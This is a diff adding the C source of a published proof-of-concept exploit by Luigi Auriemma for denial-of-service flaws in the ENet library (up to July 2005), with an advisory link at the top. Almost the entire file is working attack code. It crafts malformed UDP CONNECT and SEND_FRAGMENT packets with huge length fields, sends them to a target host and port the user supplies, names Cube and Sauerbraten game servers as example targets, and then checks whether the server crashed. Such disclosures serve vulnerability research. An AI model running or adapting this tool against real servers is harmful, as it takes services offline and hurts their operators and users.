@@ -1,0 +1,343 @@
+source: http://www.securityfocus.com/bid/17087/info
+
+ENet is prone to multiple denial-of-service vulnerabilities. A remote attacker can send specifically crafted data to trigger these flaws, leading to a denial-of-service condition.
+
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include "enet_protocol.h"
+
+#ifdef WIN32
+    #include <winsock.h>
+    #include "winerr.h"
+
+    #define close   closesocket
+    #define ONESEC  1000
+    #define MYRAND  clock()
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+    #include <sys/times.h>
+
+    #define ONESEC  1
+    #define MYRAND  times(0)
+    #define strnicmp    strncasecmp
+#endif
+
+
+
+#define VER     "0.1"
+
+
+
+u_int get_num(u_char *str);
+int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
+int timeout(int sock);
+u_int resolv(char *host);
+void std_err(void);
+
+
+
+struct  sockaddr_in peer;
+u_int   commandLength = 0xffff0000;
+
+
+
+int main(int argc, char *argv[]) {
+    ENetProtocolHeader  *header;
+    ENetProtocol        *command;
+    u_int   chall,
+            stime;
+    int     sd,
+            len,
+            attack;
+    u_char  buff[8192];
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "ENet library <= Jul 2005 multiple vulnerabilities "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> <port> [commandLength(0x%08x)]\n"
+            "\n"
+            "Attack:\n"
+            " 1 = invalid memory access\n"
+            " 2 = allocation abort with fragment\n"
+            "\n"
+            "  Default port examples: Cube on 28765, Sauerbraten on 28785\n"
+            "  commandLength is the big value to use for both the attacks, read my advisory\n"
+            "\n", argv[0], commandLength);
+        exit(1);
+    }
+
+    header  = (ENetProtocolHeader *)buff;
+    command = (ENetProtocol *)(buff + sizeof(ENetProtocolHeader));
+
+    attack = atoi(argv[1]);
+    if(argc > 4) commandLength = get_num(argv[4]);
+
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(atoi(argv[3]));
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr),
+        ntohs(peer.sin_port));
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    stime = MYRAND;
+    chall = ~stime;
+
+    if(attack == 1) {
+        printf("- send malformed packet\n");
+
+        header->peerID                              = htons(0xffff);
+        header->flags                               = 0;
+        header->commandCount                        = 1 + (MYRAND % 255);       //  major than 1
+        header->sentTime                            = stime;
+        header->challenge                           = chall;
+        command->header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
+        command->header.channelID                   = 0xff;
+        command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
+        command->header.reserved                    = 0;
+        command->header.commandLength               = htonl(commandLength);     // BOOM
+        command->header.reliableSequenceNumber      = htonl(1);
+        command->connect.outgoingPeerID             = htons(0);
+        command->connect.mtu                        = htons(1400);
+        command->connect.windowSize                 = htonl(32768);
+        command->connect.channelCount               = htonl(ENET_PROTOCOL_MINIMUM_CHANNEL_COUNT);
+        command->connect.incomingBandwidth          = htonl(0);
+        command->connect.outgoingBandwidth          = htonl(0);
+        command->connect.packetThrottleInterval     = htonl(5000);
+        command->connect.packetThrottleAcceleration = htonl(2);
+        command->connect.packetThrottleDeceleration = htonl(2);
+
+        len = send_recv(sd,
+            buff, sizeof(ENetProtocolCommandHeader) + sizeof(ENetProtocolConnect),
+            buff, sizeof(buff), 0);
+        if(len < 0) {
+            printf("- no reply from the server, it should be already crashed\n");
+        }
+
+    } else if(attack == 2) {
+
+        printf("- start connection to host\n");
+
+        printf("  send connect\n");
+        header->peerID                              = htons(0xffff);
+        header->flags                               = 0;
+        header->commandCount                        = 1;
+        header->sentTime                            = stime;
+        header->challenge                           = chall;
+        command->header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
+        command->header.channelID                   = 0xff;
+        command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
+        command->header.reserved                    = 0;
+        command->header.commandLength               = htonl(sizeof(ENetProtocolConnect));
+        command->header.reliableSequenceNumber      = htonl(1);
+        command->connect.outgoingPeerID             = htons(0);
+        command->connect.mtu                        = htons(1400);
+        command->connect.windowSize                 = htonl(32768);
+        command->connect.channelCount               = htonl(2);
+        command->connect.incomingBandwidth          = htonl(0);
+        command->connect.outgoingBandwidth          = htonl(0);
+        command->connect.packetThrottleInterval     = htonl(5000);
+        command->connect.packetThrottleAcceleration = htonl(2);
+        command->connect.packetThrottleDeceleration = htonl(2);
+
+        len = send_recv(sd,
+            buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
+            buff, sizeof(buff), 1);
+
+        printf("  send ack\n");
+/* SRV  header->peerID                              */
+        header->flags                               = 0;
+        header->commandCount                        = 1;
+        stime = ntohl(header->sentTime);                                        // useless???
+        header->sentTime                            = htonl(stime + 1);
+/* SRV  header->challenge                           */
+        command->header.command                     = ENET_PROTOCOL_COMMAND_ACKNOWLEDGE;
+/* SRV  command->header.channelID                   */  
+        command->header.flags                       = 0;
+        command->header.reserved                    = 0;
+        command->header.commandLength               = htonl(sizeof(ENetProtocolAcknowledge));
+        command->header.reliableSequenceNumber      = htonl(1);
+/* SRV  command->acknowledge.receivedReliableSequenceNumber */
+        command->acknowledge.receivedSentTime       = htonl(stime);
+
+        len = send_recv(sd,
+            buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
+            buff, sizeof(buff), 1);
+
+        printf("  send malformed fragment\n");
+        len = 10 + (MYRAND % 1000);
+/* SRV  header->peerID                              */
+        header->flags                               = 0;
+        header->commandCount                        = 1;
+        header->sentTime                            = htonl(ntohl(header->sentTime) + 1);
+/* SRV  header->challenge                           */
+        command->header.command                     = ENET_PROTOCOL_COMMAND_SEND_FRAGMENT;
+        command->header.channelID                   = 0;
+        command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
+        command->header.reserved                    = 0;
+        command->header.commandLength               = htonl(sizeof(ENetProtocolSendFragment) + len);
+        command->header.reliableSequenceNumber      = htonl(1);
+        command->sendFragment.startSequenceNumber   = htonl(1);
+        command->sendFragment.fragmentCount         = htonl(2 + (MYRAND % 2000));
+        command->sendFragment.fragmentNumber        = htonl(0);
+        command->sendFragment.totalLength           = htonl(commandLength);
+        command->sendFragment.fragmentOffset        = htonl(0);
+        memset(command + sizeof(ENetProtocolSendFragment), len, len);   // first len is for random
+
+        len = send_recv(sd,
+            buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
+            buff, sizeof(buff), 0);
+        if(len < 0) {
+            printf("- no reply from the server, it should be already crashed\n");
+        }
+    }
+
+    close(sd);
+
+    printf("- check server:\n");
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    stime = MYRAND;
+    chall = ~stime;
+
+    header->peerID                              = htons(0xffff);
+    header->flags                               = 0;
+    header->commandCount                        = 1;
+    header->sentTime                            = stime;
+    header->challenge                           = chall;
+    command->header.command                     = ENET_PROTOCOL_COMMAND_CONNECT;
+    command->header.channelID                   = 0xff;
+    command->header.flags                       = ENET_PROTOCOL_FLAG_ACKNOWLEDGE;
+    command->header.reserved                    = 0;
+    command->header.commandLength               = htonl(sizeof(ENetProtocolConnect));
+    command->header.reliableSequenceNumber      = htonl(1);
+    command->connect.outgoingPeerID             = htons(0);
+    command->connect.mtu                        = htons(1400);
+    command->connect.windowSize                 = htonl(32768);
+    command->connect.channelCount               = htonl(ENET_PROTOCOL_MINIMUM_CHANNEL_COUNT);
+    command->connect.incomingBandwidth          = htonl(0);
+    command->connect.outgoingBandwidth          = htonl(0);
+    command->connect.packetThrottleInterval     = htonl(5000);
+    command->connect.packetThrottleAcceleration = htonl(2);
+    command->connect.packetThrottleDeceleration = htonl(2);
+
+    len = send_recv(sd,
+        buff, sizeof(ENetProtocolCommandHeader) + ntohl(command->header.commandLength),
+        buff, sizeof(buff), 0);
+    if(len < 0) {
+        printf("\n  Server IS vulnerable!!!\n\n");
+    } else {
+        printf("\n  Server does not seem vulnerable\n\n");
+    }
+    close(sd);  
+    return(0);
+}
+
+
+
+u_int get_num(u_char *str) {
+    u_int   offset;
+
+    if(!strnicmp(str, "0x", 2)) {
+        sscanf(str + 2, "%x", &offset);
+    } else {
+        sscanf(str, "%u", &offset);
+    }
+    return(offset);
+}
+
+
+
+int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
+    int     retry,
+            len;
+
+    for(retry = 3; retry; retry--) {
+        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+        if(!timeout(sd)) break;
+    }
+
+    if(!retry) {
+        if(!err) return(-1);
+        fputs("\nError: socket timeout, no reply received\n\n", stdout);
+        exit(1);
+    }
+
+    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
+    if(len < 0) std_err();
+    return(len);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec  = 2;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_int resolv(char *host) {
+    struct  hostent *hp;
+    u_int   host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_int *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
